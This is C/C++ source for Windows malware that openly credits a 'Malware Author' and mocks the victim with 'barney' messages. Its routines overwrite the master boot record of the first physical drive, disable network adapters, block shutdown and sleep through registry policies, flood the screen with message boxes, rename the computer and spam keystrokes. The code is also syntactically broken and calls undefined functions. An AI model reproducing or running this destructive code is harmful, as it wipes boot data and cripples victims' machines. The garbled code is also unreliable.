#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <iostream>
#include <stdbool.h>
#include <windows.h>
#include <xdo.h>

int main()
{
    trollies()
    filebomb()
    registrycorruption()
    keyboardspam()
    mbroverwrite()
    return 0;
}

void mbroverwrite()
{
    char mbrData[512]; // 512 bytes
    ZeroMemory(&mbrData, sizeof(mbrData));

    HANDLE MBR = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_ALL | FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
    WriteFile(MBR, mbrData, 512, NULL, NULL);
    CloseHandle(MBR);
}

void filebomb()
{
    while (true) 
    {
    FILE *fptr;
    fptr = fopen("filename.txt", "w");
    }
}


void registrycorruption()
{
    HKEY hKey;
    DWORD dwDisposition;
    LONG lResult;

    lResult = RegCreateKeyEx(HKEY_CURRENT_USER,
                             "Software\\MyApp",
                             0,
                             NULL,
                             REG_OPTION_NON_VOLATILE,
                             KEY_ALL_ACCESS,
                             NULL,
                             &hKey,
                             &dwDisposition);

    if (lResult == ERROR_SUCCESS)
    {
        lResult = RegSetValueEx(hKey,
                                "MyValue",
                                0,
                                REG_DWORD,
                                (BYTE*)&dwMyValue,
                                sizeof(DWORD));

    RegCloseKey(hKey);
    }
}

void crypter(unsigned char* bytes, size_t arrsize, unsigned char* key, size_t keysize)
{
    if (bytes == nullptr || key == nullptr)
        return;

    if (keysize > 1)
    {
        size_t j = 0;
        for (size_t i = 0; i < arrsize; ++i)
        {
            bytes[i] = bytes[i] ^ key[j];
            j = (j + 1) % keysize;
        }
    }
    else
    {
        for (size_t i = 0; i < arrsize; ++i)
        {
            bytes[i] = bytes[i] ^ key[0];
        }
    }
}

void keyboardspam()
  
  while (1) {
    const char *text = "barney";
    INPUT inputs[6 * 2] = {0}; // Each character and its release

    for (int i = 0; i < 6; i++) {
        inputs[i * 2].type = inputs[i * 2 + 1].type = INPUT_KEYBOARD;
        inputs[i * 2].ki.wVk = inputs[i * 2 + 1].ki.wVk = toupper(text[i]);
        inputs[i * 2 + 1].ki.dwFlags = KEYEVENTF_KEYUP;
    }
  }

    // Send the input events
    SendInput(12, inputs, sizeof(INPUT));

void trollies()
{
    printf("\033[0;35m"  // ANSI escape code for purple color
           " ▄▄▄▄    ▄▄▄       ██▀███   ███▄    █ ▓█████▓██   ██▓\n"
           "▓█████▄ ▒████▄    ▓██ ▒ ██▒ ██ ▀█   █ ▓█   ▀ ▒██  ██▒\n"
           "▒██▒ ▄██▒██  ▀█▄  ▓██ ░▄█ ▒▓██  ▀█ ██▒▒███    ▒██ ██░\n"
           "▒██░█▀  ░██▄▄▄▄██ ▒██▀▀█▄  ▓██▒  ▐▌██▒▒▓█  ▄  ░ ▐██▓░\n"
           "░▓█  ▀█▓ ▓█   ▓██▒░██▓ ▒██▒▒██░   ▓██░░▒████▒ ░ ██▒▓░\n"
           "░▒▓███▀▒ ▒▒   ▓▒█░░ ▒▓ ░▒▓░░ ▒░   ▒ ▒ ░░ ▒░ ░  ██▒▒▒ \n"
           "▒░▒   ░   ▒   ▒▒ ░  ░▒ ░ ▒░░ ░░   ░ ▒░ ░ ░  ░▓██ ░▒░ \n"
           " ░    ░   ░   ▒     ░░   ░    ░   ░ ░    ░   ▒ ▒ ░░  \n"
           " ░            ░  ░   ░              ░    ░  ░░ ░      \n"
           "      ░                                      ░ ░      \n"
           "            Malware Author: Azrael\n"
           "\033[0m");  // Reset color

    printf("\033[0;35m"  // ANSI escape code for purple color
           "You got infected by barney,\nyour computer isn't yours anymore but belongs to barney.\n"
           "You have 5 minutes to save your computer. Good luck :D\n"
           "\033[0m");  // Reset color
    
    //Spam error message box
    for (int i = 0; i < 300; i++)
        MessageBox(
            NULL,
            "You got infected by barney,\nyour computer isn't yours anymore but belongs to barney.\n"
            "BARNEY",
            "BARNEY",
            MB_ABORTRETRYIGNORE | MB_DEFBUTTON2 | MB_ICONERROR
        );

    // Change wallpaper
    system("reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "wallpaper.jpg" /f")

    // Change scheme to b&w
    system("powershell Set-ItemProperty -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize -Name SystemUsesLightTheme -Value 0")

    // Change computer name
    SetComputerNameEx(ComputerNamePhysicalNetBIOS, L"Barney");

    //Opens browser
    for (int i = 0; i < 20; i++)
    system("start https://www.google.com/search?q=barney+is+looking+for+you")

    // Plays barney music
    for (int i = 0; i < 20; i++) {
    PlaySound("music.wav", NULL, SND_FILENAME|SND_ASYNC);
    }

    // Corrupts registry and files
    corruption();

    // Disable Internet Connection
    system("powershell -Command \"Get-NetAdapter | Disable-NetAdapter -Confirm:$false\"");

    //Disables shutdown, hibernation and sleep.
    system("powershell New-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" -Name \"NoClose\" -Value 1 -PropertyType DWORD -Force; New-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" -Name \"DisableRestartSignout\" -Value 1 -PropertyType DWORD -Force; Set-ItemProperty -Path \"HKCU:\\Control Panel\\Desktop\" -Name \"PowerOffActive\" -Value 0 -Type DWORD -Force");

    // Encrypts files
    unsigned char key[] = {0x00, 0xFF, 0x01, 0x0F};
    int keysize = 1;
    char* text = "barneybarneymalware";
    crypter((unsigned char*)text, strlen(text), key, keysize); 


}
